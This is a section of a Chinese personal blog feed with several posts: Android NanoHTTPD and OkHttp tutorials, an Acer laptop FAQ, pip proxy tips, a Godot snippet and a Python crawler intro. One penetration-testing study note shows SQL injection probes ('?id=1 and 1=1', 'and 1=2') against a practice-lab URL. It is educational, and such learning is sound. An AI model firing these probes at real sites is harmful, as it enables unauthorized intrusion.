        <content type="html"><![CDATA[<h3 id="NanoHTTPD-简介"><a href="#NanoHTTPD-简介" class="headerlink" title="NanoHTTPD 简介"></a>NanoHTTPD 简介</h3><p><strong>NanoHTTPD</strong> 是一个轻量级的 Java HTTP 服务器，可以嵌入到任何 Java 应用中，包括 Android 应用。它非常适合用于开发小型 Web 服务或 API，因为它简单易用且具有较小的内存占用。NanoHTTPD 支持静态和动态内容的处理，并且可以在多种环境下运行。</p><h3 id="NanoHTTPD-的主要特性"><a href="#NanoHTTPD-的主要特性" class="headerlink" title="NanoHTTPD 的主要特性"></a>NanoHTTPD 的主要特性</h3><ul><li><strong>小巧</strong>: 整个库很小，适合嵌入。</li><li><strong>简单</strong>: API 设计清晰，易于使用。</li><li><strong>支持多种 MIME 类型</strong>: 可以根据需求返回不同类型的内容（如 HTML、JSON、图片等）。</li><li><strong>灵活性</strong>: 支持自定义请求处理逻辑。</li></ul><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><figure class="highlight kotlin"><table><tbody><tr><td class="code"><pre><span class="line">implementation(<span class="string">"org.nanohttpd:nanohttpd:2.3.0"</span>)</span><br></pre></td></tr></tbody></table></figure><p>如果无法使用请在构建里clean后Rebuild，然后再构建输出里检查是否开始下载依赖包</p><h2 id="创建示例类"><a href="#创建示例类" class="headerlink" title="创建示例类"></a>创建示例类</h2><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.happy_deer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> fi.iki.elonen.NanoHTTPD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleHttpServer</span> <span class="keyword">extends</span> <span class="title class_">NanoHTTPD</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleHttpServer</span><span class="params">(<span class="type">int</span> port)</span> {</span><br><span class="line">        <span class="built_in">super</span>(port);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Response <span class="title function_">serve</span><span class="params">(IHTTPSession session)</span> {</span><br><span class="line">        <span class="type">String</span> <span class="variable">htmlResponse</span> <span class="operator">=</span> <span class="string">"&lt;html&gt;"</span> +</span><br><span class="line">                <span class="string">"&lt;head&gt;&lt;title&gt;Welcome&lt;/title&gt;&lt;/head&gt;"</span> +</span><br><span class="line">                <span class="string">"&lt;body&gt;"</span> +</span><br><span class="line">                <span class="string">"&lt;h1&gt;Hello, World!&lt;/h1&gt;"</span> +</span><br><span class="line">                <span class="string">"&lt;p&gt;This is a simple web page served from NanoHttpd!&lt;/p&gt;"</span> +</span><br><span class="line">                <span class="string">"&lt;/body&gt;"</span> +</span><br><span class="line">                <span class="string">"&lt;/html&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> newFixedLengthResponse(Response.Status.OK, <span class="string">"text/html"</span>, htmlResponse);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>继承包还需要重写两个方法，可以只重写上面的方法，作用是定义端口，然后在下面重写网页。</p><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> SimpleHttpServer server;</span><br></pre></td></tr></tbody></table></figure><p>首先声明变量，一般是写在类顶部</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">server = <span class="keyword">new</span> <span class="title class_">SimpleHttpServer</span>(<span class="number">8080</span>); <span class="comment">// 使用8080端口</span></span><br><span class="line">server.start();</span><br><span class="line">Log.e(<span class="string">"DevelopersActivity"</span>,<span class="string">"Server已启动"</span>);</span><br></pre></td></tr></tbody></table></figure><p>设定好端口后就启动成功了，通过ip:端口的方式访问，本机一般是<a href="http://localhost:8080,当然你也可以写一个方法查询当前IP然后显示出来，这样也方便之后其他局域网好友访问">http://localhost:8080,当然你也可以写一个方法查询当前IP然后显示出来，这样也方便之后其他局域网好友访问</a></p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getLocalIpAddress</span><span class="params">(Context context)</span> {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="comment">// 获取 WifiManager</span></span><br><span class="line">        <span class="type">WifiManager</span> <span class="variable">wifiManager</span> <span class="operator">=</span> (WifiManager) context.getSystemService(Context.WIFI_SERVICE);</span><br><span class="line">        <span class="type">WifiInfo</span> <span class="variable">wifiInfo</span> <span class="operator">=</span> wifiManager.getConnectionInfo();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 IP 地址，返回值为 int 型，需要转换为字符串</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ipAddress</span> <span class="operator">=</span> wifiInfo.getIpAddress();</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"%d.%d.%d.%d"</span>,</span><br><span class="line">                (ipAddress &amp; <span class="number">0xff</span>),</span><br><span class="line">                (ipAddress &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>),</span><br><span class="line">                (ipAddress &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),</span><br><span class="line">                (ipAddress &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">    } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="使用获取地址的方法"><a href="#使用获取地址的方法" class="headerlink" title="使用获取地址的方法"></a>使用获取地址的方法</h2><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">localIpAddress</span> <span class="operator">=</span> getLocalIpAddress(DevelopersActivity.<span class="built_in">this</span>);</span><br><span class="line">System.out.println(<span class="string">"Local IP Address: "</span> + localIpAddress);</span><br><span class="line">logTextView.setText(<span class="string">"Server已启动，在模拟器上通过localhost:8080访问成功，真机测试:"</span> + localIpAddress + <span class="string">":8080"</span>);</span><br></pre></td></tr></tbody></table></figure><p>到这里已经可以简单的创建一个HTTP服务器了，由于NanoHTTPD的特性，一般用来实现一些简单的数据显示比较好，并不适合去做一个庞大的Web，小巧和轻量才是使用它的正确方式</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Acer_Notebook_FAQ_and_Maintenance</title>
      <link href="/NANABLOG/2024/09/19/Acer_Notebook_FAQ_and_Maintenance/"/>
      <url>/NANABLOG/2024/09/19/Acer_Notebook_FAQ_and_Maintenance/</url>
      
        <content type="html"><![CDATA[<h2 id="关于本页面"><a href="#关于本页面" class="headerlink" title="关于本页面"></a>关于本页面</h2><p>欢迎来到本页面！这是一个专注于 <strong>宏碁掠夺者擎neo</strong> 笔记本电脑的非官方社区平台。在这里，我们汇集了网络上关于该型号笔记本的常见问题、解决方案以及个人经验分享。我们的目标是为用户提供有价值的信息，帮助大家更好地使用这款优秀的设备。</p><p>我们鼓励用户积极参与讨论，分享自己的经验和技巧，以便共同成长，建立一个良好的社群环境。无论是故障排除、性能优化还是使用技巧，我们都希望能在这里找到答案。</p><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>请注意，本页面所收录的内容均来源于网络和个人经验，仅供参考。我们尽力确保信息的准确性和实用性，但不对任何因使用本页面内容而导致的问题承担责任。您的使用和应用建议由您自行判断和承担风险。</p><p>如果您在使用过程中遇到任何问题，建议联系官方客服或专业技术支持团队。本页面及其运营者对于任何损失、损害或其他不良后果概不负责。</p><p>感谢您的理解与支持！希望您在这里能够找到有用的信息，愉快地使用您的 宏碁掠夺者擎neo 笔记本电脑！</p><h2 id="参与编写"><a href="#参与编写" class="headerlink" title="参与编写"></a>参与编写</h2><p>当你遇到了一个问题，并且解决的时候，是如此的开心，但如果能将经验分享给大家，那将或许帮助更多的人，我们总是在接受别人的帮助，遇到问题去检索，但这些答案也是哪些无私奉献的人所编写的不是吗，所以为了让环境更加好，如果你有能力，喜欢帮助他人，就参与其中吧！感谢所有人。</p><h2 id="常见问题一览"><a href="#常见问题一览" class="headerlink" title="常见问题一览"></a>常见问题一览</h2><ol><li><strong>雷电4接口问题</strong>：使用TypeC to DP外接显示器时，NV控制面板的设置可能固定在“Optimus”无法切换。解决方案是在BIOS里设置：Advanced→Display mode→Nvidia GPU only。</li><li><strong>系统睡眠或重启后PIN码问题</strong>：登录界面提示PIN码不可用（代码：0x8028008b）。可以尝试在BIOS设置：Main→Wake on USB while lid closed打开开关。</li><li><strong>开机LOGO声音</strong>：可以在BIOS设置：Main→Sound：Mute来关闭声音。</li><li><strong>电源适配器和电源线接口松动</strong>：这是一个普遍存在的问题，目前没有解决方案。</li><li><strong>低负载死机</strong>：有用户报告1.13版本BIOS已经修复了这个问题。</li><li><strong>数字键位电流声</strong>：关闭键盘背光时，数字0附近有轻微声音，但不影响使用。</li><li><strong>显卡混合模式下屏幕闪烁</strong>：官方称这是正常现象，如果介意可以在BIOS里设置：Advanced→Display mode→Nvidia GPU only。</li><li><strong>固态硬盘最大容量</strong>：官方只测试了1TB的固态硬盘，但有用户测试过2TB也可以使用。</li><li><strong>更换液金影响保修</strong>：京东自营客服表示，自行更换液金只要不损坏硬件就不影响保修，但具体是否影响保修由官方售后决定。</li><li><strong>内存频率问题</strong>：更换内存后可能只有4800频率，i9款能到5600频率，且目前只支持海力士颗粒到5600。</li><li><strong>序列号查询不到</strong>：需要使用Acer微信公众号提供的查询链接才能查到。</li><li><strong>自带摄像头无法开启Windows Hello</strong>：因为自带摄像头没有红外功能。</li><li><strong>电池排线上的黑色固定胶带</strong>：如果丢失，可以自己贴上普通的醋酸布胶带。</li><li><strong>屏幕漏光问题</strong>：有用户反映屏幕漏光现象，但这并不是所有设备都存在的问题。</li><li><strong>调度问题</strong>：有用户提到在实际使用中可能会遇到调度问题，如游戏时可能会遇到黑屏、闪退或卡顿。</li><li><strong>控制台问题</strong>：有用户反映宏碁掠夺者控制台出现各种问题，如灯光风扇不生效、无法调节、打不开等。</li><li><strong>CPU温度过高</strong>：有用户报告在待机状态下CPU温度高达60+，玩游戏时温度可升至100度。</li></ol><h2 id="在购买电脑前的准备工作"><a href="#在购买电脑前的准备工作" class="headerlink" title="在购买电脑前的准备工作"></a>在购买电脑前的准备工作</h2><ul><li>提前了解验机的相关知识</li><li>准备一个U盘提前下载好图吧工具箱</li><li>了解关于计算机的基础知识，如CPU,GPU</li><li>对购买平台的选择和权衡</li></ul><h2 id="开始验机"><a href="#开始验机" class="headerlink" title="开始验机"></a>开始验机</h2><ul><li><p>如何跳过网络进行验机</p></li><li><p>安装图吧工具箱进行烤机</p></li><li><p>了解GPU烤，CPU烤，双烤等相关知识</p></li><li><p>查看配置信息是否准确</p></li><li><p>检查电源</p></li><li><p>检查屏幕</p></li><li><p>使用工具箱对硬盘，内存，CPU，GPU等信息全面排查</p></li><li><p>根据不同的平台，你需要懂得权衡，如果翻车，请不要犹豫的退款或者申请换新，如果是小问题可以忽略不计，总之还是要权衡</p></li></ul><h2 id="关于液晶的注意事项"><a href="#关于液晶的注意事项" class="headerlink" title="关于液晶的注意事项"></a>关于液晶的注意事项</h2><p>当我在使用笔记本时，或许最关注的就是液晶的问题了，甚至可以说，我或许得了“液晶病”，一方面赞同液晶的导热性，一方面害怕液晶带来的毁灭性打击。</p><p>在很多时候，这个问题甚至和笔记本没有关系，而是在我的脑海中不断的打架，考虑是否换相变片等等。</p><p>在网上寻找答案，看到各种回答，显得更加焦虑，不知道如何是好，有的人说好，有的人极力排斥，难以抉择。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android开发使用okhttpGet请求api解析json</title>
      <link href="/NANABLOG/2024/09/18/Android%E5%BC%80%E5%8F%91%E4%BD%BF%E7%94%A8okhttpGet%E8%AF%B7%E6%B1%82api%E8%A7%A3%E6%9E%90json/"/>
      <url>/NANABLOG/2024/09/18/Android%E5%BC%80%E5%8F%91%E4%BD%BF%E7%94%A8okhttpGet%E8%AF%B7%E6%B1%82api%E8%A7%A3%E6%9E%90json/</url>
      
        <content type="html"><![CDATA[<p>案例:</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.happy_deer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.annotation.NonNull;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> okhttp3.Call;</span><br><span class="line"><span class="keyword">import</span> okhttp3.Callback;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> okhttp3.OkHttpClient;</span><br><span class="line"><span class="keyword">import</span> okhttp3.Request;</span><br><span class="line"><span class="keyword">import</span> okhttp3.Response;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UpdateApp</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fetchJsonData</span><span class="params">()</span> {</span><br><span class="line"></span><br><span class="line">        <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">"实际api"</span>; <span class="comment">// 替换为你的 API URL</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                .url(url)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 enqueue 进行异步请求</span></span><br><span class="line">        client.newCall(request).enqueue(<span class="keyword">new</span> <span class="title class_">Callback</span>() {</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFailure</span><span class="params">(<span class="meta">@NonNull</span> Call call, <span class="meta">@NonNull</span> IOException e)</span> {</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            }</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResponse</span><span class="params">(<span class="meta">@NonNull</span> Call call, <span class="meta">@NonNull</span> Response response)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">                <span class="keyword">if</span> (response.isSuccessful()){</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">responseBody</span> <span class="operator">=</span> response.body().string();</span><br><span class="line">                    <span class="comment">// 在这里处理你的 JSON 数据</span></span><br><span class="line">                    parseJson(responseBody);</span><br><span class="line">                    <span class="comment">// 为了更新 UI，记得回到主线程</span></span><br><span class="line">                }<span class="keyword">else</span> {</span><br><span class="line">                    Log.e(<span class="string">"UpdateApp"</span>,<span class="string">"无法获取json"</span>);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        });</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">parseJson</span><span class="params">(String responseBody)</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="comment">// 将响应体转换为 JSONObject</span></span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(responseBody);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取 "tag_name" 的值</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">tagName</span> <span class="operator">=</span> jsonObject.getString(<span class="string">"tag_name"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出结果</span></span><br><span class="line">            Log.i(<span class="string">"TAG"</span>, <span class="string">"Tag Name: "</span> + tagName);</span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>tip:需要注意的是，获取到的json在final String responseBody = response.body().string();，我为了拿到自己想要的值，使用官方自带的JSONObject，获取到名为tag_name的数据。</p><p>这是我github上发行的APK版本号，目的是为了更新APP。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip的基本使用方法</title>
      <link href="/NANABLOG/2024/08/30/pip%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/NANABLOG/2024/08/30/pip%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Clash-for-Windows代理加速pip"><a href="#Clash-for-Windows代理加速pip" class="headerlink" title="Clash for Windows代理加速pip"></a>Clash for Windows代理加速pip</h1><h4 id="如果使用-HTTP-代理："><a href="#如果使用-HTTP-代理：" class="headerlink" title="如果使用 HTTP 代理："></a>如果使用 HTTP 代理：</h4><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">pip install --proxy http://127.0.0.1:7890 pyinstaller</span><br></pre></td></tr></tbody></table></figure><h4 id="如果使用-SOCKS-代理："><a href="#如果使用-SOCKS-代理：" class="headerlink" title="如果使用 SOCKS 代理："></a>如果使用 SOCKS 代理：</h4><p>请注意，<code>pip</code> 默认不支持 SOCKS 代理，但可以通过其他工具（如 <code>corkscrew</code>）实现。</p><p>如果你仍然需要使用 SOCKS，可以考虑先将其转换为 HTTP（使用一些适配器），或者使用其他方法进行代理。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透学习之掌控者教程</title>
      <link href="/NANABLOG/2024/08/22/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%8E%8C%E6%8E%A7%E8%80%85%E6%95%99%E7%A8%8B/"/>
      <url>/NANABLOG/2024/08/22/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%8E%8C%E6%8E%A7%E8%80%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>本笔记跟随封神台的在线攻防演练平台学习，感谢提供这么好的免费学习平台。</p><h2 id="第一章-SQL注入攻击原理-实战演练"><a href="#第一章-SQL注入攻击原理-实战演练" class="headerlink" title="第一章 SQL注入攻击原理 实战演练"></a>第一章 SQL注入攻击原理 实战演练</h2><p>目标网址:<a href="http://pu2lh35s.ia.aqlab.cn/">http://pu2lh35s.ia.aqlab.cn/</a></p><p>第一步，判断是否存在SQL漏洞，想要探寻漏洞的方法有很多，通过KALI的的SQLmap，或者更加简单粗暴一点</p><p>使用?id=1 and 1=1检测是否预防了SQL注入，这样的语句返回解决永远为ture，如果正常返回页面，说明该网站有可能存在SQL注入漏洞</p><p>使用?id=1 and 1=2来观察是否页面是否发生了改变，这样的语句返回永远为false，执行这样的结果将返回一个空结果集，如果正常返回，，这通常意味着您的输入被应用程序错误处理或执行，从而表明存在潜在的 SQL 注入漏洞。</p><p><strong>为什么表示存在漏洞</strong></p><p>如果您能够通过简单的输入（例如 <code>?id=1 AND 1=2</code>）改变页面行为或内容，这通常意味着应用程序对用户输入的验证或处理不够严格，具体表现为：</p><ul><li><strong>输入未经过滤</strong>：用户输入直接用于构造 SQL 查询，未进行适当的转义或过滤。</li><li><strong>异常处理不当</strong>：系统未能安全地管理数据库操作中的异常情况，可能会暴露出系统内部的实现细节。</li><li><strong>无法预知的行为</strong>：如果输入可以控制输出，尤其是与数据库交互，说明该应用程序存在潜在的 SQL 注入风险。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游戏设计的巧思</title>
      <link href="/NANABLOG/2024/08/21/%E6%B8%B8%E6%88%8F%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%B7%A7%E6%80%9D/"/>
      <url>/NANABLOG/2024/08/21/%E6%B8%B8%E6%88%8F%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%B7%A7%E6%80%9D/</url>
      
        <content type="html"><![CDATA[<p> 我从小就喜欢游戏，喜欢冒险，喜欢解密，我怀念了曾经在地牢将背后托付给朋友，怀念意见不合的时候彼此的挣扎和事后的复盘。</p><p>现在我的更加感兴趣那些游戏背后的技术，当你踏入这个领域，顿时就理解了游戏开发者的厉害之处，当我们因为发现了一个捷径感到沾沾自喜的时候，作者已经在背后露出了欣慰的笑容，</p><p>同样的效果，往往有不同的实现方式，这些方式也决定了游戏的优化和流畅，你可以使用很笨的办法， 给每一个区域增加很多的判断来人物不会穿模，亦或者写一个精练的算法来完成，不论那种方法效果看起来都是一样的，但背后使用的内存和计算可能不同，在前期将游戏的程序框架设计好，减少无用的代码，使用更加高效的算法，来减少硬件的负担，同时让你的游戏在更多的设备上运行，相信我，如果你做了这些，未来的你将会感谢现在的自己。</p><p>我知道我接下来说的这些可能有一些争论，但这只是我个人的看法，而我的目的也是为了让生态圈更好。</p><p>据我观察，中国的程序员在对优化的权重上比较低，对大部分人来说，项目能够运行和稳定就足够了，再加上如果是在公司，那么面临业绩考核，大家比起优化做的更多的是修复BUG和增加新的功能，所以让项目更加的臃肿不堪。</p><p>如果你玩过《动物井》，你会知道作者为了优化，自研开发引擎，最终在20MB的大小内塞入了一个游玩时长6个小时左右的游戏，这样的精神让人敬佩。</p><p>我不觉得我们就很差，我们是缺少一个环境，一个能够让我们花费数十周只为了优化一个节点的环境。</p><p>生活简单一点，工作简单一点，专一。</p><h3 id="godot上关于概率的方法设计"><a href="#godot上关于概率的方法设计" class="headerlink" title="godot上关于概率的方法设计"></a>godot上关于概率的方法设计</h3><figure class="highlight c#"><table><tbody><tr><td class="code"><pre><span class="line">extends Node</span><br><span class="line"></span><br><span class="line"><span class="meta"># 自定义成功几率并判断制作是否成功的函数</span></span><br><span class="line"><span class="function">func <span class="title">craft_item</span>(<span class="params">success_chance: <span class="built_in">float</span></span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line"><span class="function">    # 检查成功几率是否在 0 到 1 之间</span></span><br><span class="line"><span class="function">    <span class="keyword">if</span> success_chance &lt; 0.0 <span class="keyword">or</span> success_chance &gt; 1.0:</span></span><br><span class="line"><span class="function">        <span class="title">print</span>(<span class="params"><span class="string">"成功几率必须在 0 到 1 之间！"</span></span>)</span></span><br><span class="line"><span class="function">        <span class="keyword">return</span> <span class="literal">false</span>  # 返回 <span class="literal">false</span> 表示无效</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    # 生成一个0到1之间的随机浮点数</span></span><br><span class="line"><span class="function">    <span class="keyword">var</span> random_value</span> = randf()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> random_value &lt; success_chance:</span><br><span class="line">        print(<span class="string">"制作成功！"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>  <span class="meta"># 制作成功</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"制作失败！"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>  <span class="meta"># 制作失败</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 在_ready()或其他合适的位置调用此函数</span></span><br><span class="line">func _ready():</span><br><span class="line">    Randomize()  <span class="meta"># 初始化随机数生成器</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta"># 尝试不同几率制作物品</span></span><br><span class="line">    <span class="keyword">var</span> item1_success = craft_item(<span class="number">0.1</span>)  <span class="meta"># 10%的成功概率</span></span><br><span class="line">    <span class="keyword">var</span> item2_success = craft_item(<span class="number">0.5</span>)  <span class="meta"># 50%的成功概率</span></span><br><span class="line">    <span class="keyword">var</span> item3_success = craft_item(<span class="number">0.9</span>)  <span class="meta"># 90%的成功概率</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> godot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫学习笔记</title>
      <link href="/NANABLOG/2024/08/10/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/08/10/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>我记得当初刚接触编程的时候，就想要学习爬虫，因为那时候我对自己的定位是偏向黑客方面的23333，感觉很酷，但当时连一门编程语言都没有搞明白，所以也学的一塌糊涂。</p><p>这也说明了学习顺序的重要性，还记得之前学渗透的时候，提前搞明白了通信原理，学习的速度快了很多，反之则迟迟无法理解。</p><p>回到主题，这次我学习的是python爬虫。为什么选择python，因为python提供了很多的包，这让我们实现功能更加的方便，当然你也可以使用JAVA，C等去写，但对于新手而言，我还是推荐python，同时Python 提供了多线程和异步编程的支持，可以提高爬虫的效率，在抓取大量数据时尤为重要。</p><h2 id="什么是爬虫"><a href="#什么是爬虫" class="headerlink" title="什么是爬虫"></a>什么是爬虫</h2><p><strong>爬虫（Web Crawler）</strong> 是一种自动访问互联网并提取特定信息的程序或脚本。它通过模拟浏览器行为，访问网页并获取数据。</p><p>主要功能：</p><ol><li>数据采集：从网站上收集文本、图片等信息，广泛应用于市场研究、数据分析等领域。</li><li>搜索引擎索引：搜索引擎使用爬虫来抓取和索引网页，以便提供相关的搜索结果。</li><li>内容监控：监测特定网站的更新，如价格变化、新闻发布等。</li><li>机器学习数据准备：为模型训练收集大量数据。</li></ol><p>工作原理：</p><ol><li>初始化：从一个或多个种子 URL 开始。</li><li>发送请求：向种子 URL 发送 HTTP 请求以获取网页内容。</li><li>解析数据：解析 HTML 文档，提取所需的信息。</li><li>存储数据：将提取的数据保存到数据库或文件中。</li><li>提取新链接：从当前网页中提取新的链接，并加入待爬取列表。</li><li>循环执行：重复上述步骤，直到满足停止条件。</li></ol><p>注意事项：</p><ul><li>遵循法律法规及网站的 <code>robots.txt</code> 文件规则。</li><li>控制爬取频率，避免对目标网站造成影响。</li></ul><h2 id="爬取百度主页"><a href="#爬取百度主页" class="headerlink" title="爬取百度主页"></a>爬取百度主页</h2><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#导包</span></span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置网站路径</span></span><br><span class="line">url = <span class="string">"http://www.baidu.com"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开网站并返回结果</span></span><br><span class="line">resp = urlopen(url)</span><br><span class="line">html_str = resp.read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编写一个正则表达式来匹配card_title的值</span></span><br><span class="line"><span class="comment"># 假设card_title总是以"card_title": "开始并以"结尾</span></span><br><span class="line">pattern = <span class="string">r'"card_title": "(.*?)"'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用re.findall查找所有匹配的card_title</span></span><br><span class="line">card_titles = re.findall(pattern, html_str, re.DOTALL)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印所有找到的card_title</span></span><br><span class="line"><span class="keyword">for</span> title <span class="keyword">in</span> card_titles:</span><br><span class="line">    <span class="built_in">print</span>(title)</span><br></pre></td></tr></tbody></table></figure><p>这段代码实现了爬取baidu.com的页面，然后获取主页的新闻标题并且打印在控制台</p><h3 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h3><p>可以看到开头我导入了两个包，分别是urlopen 和 re，第一个包名字就很直观，打开url，因为我们只需要urlopen，所以可以看到from 来自 urllib.request 的 urlopen被我们单独拿出来导入了项目里。</p><p>而 re 是为了快速找到我们需要的字符串，通过re.findall方法按规则输入好相关参数就可以提取出来内容。</p><p>要注意的是，使用urlopen方法返回的结果如果是乱码，那就需要根据网页的编码设置去设置，不然是无法显示中文的，比如这里的baidu.com是utf-8，所以我们要调用阅读的方法然后设置好编码后再次返回结果，这次返回的就是整个正常的网页源代码。</p><h2 id="Web请求过程刨析"><a href="#Web请求过程刨析" class="headerlink" title="Web请求过程刨析"></a>Web请求过程刨析</h2><p>现在的网站大体分为两种，静态网站和动态网站，顾名思义，静态网站的一些信息（如文本、图像等）直接包含在网页的 HTML 代码中，访问网页时能直接看到，而动态网站有些数据则需要在网页加载后通过 JavaScript 进行请求，这部分数据不会出现在源代码中。</p><p>所以想要获取到动态网站的数据，我们要理解其原理。</p><h3 id="网页数据提取原理"><a href="#网页数据提取原理" class="headerlink" title="网页数据提取原理"></a>网页数据提取原理</h3><p>在现代网页中，有些数据不是直接嵌入到 HTML 源代码中的，而是通过 JavaScript 进行动态加载。这些数据通常来自于额外的 API 请求。以下是这一过程的基本原理：</p><h4 id="1-网页结构"><a href="#1-网页结构" class="headerlink" title="1. 网页结构"></a>1. 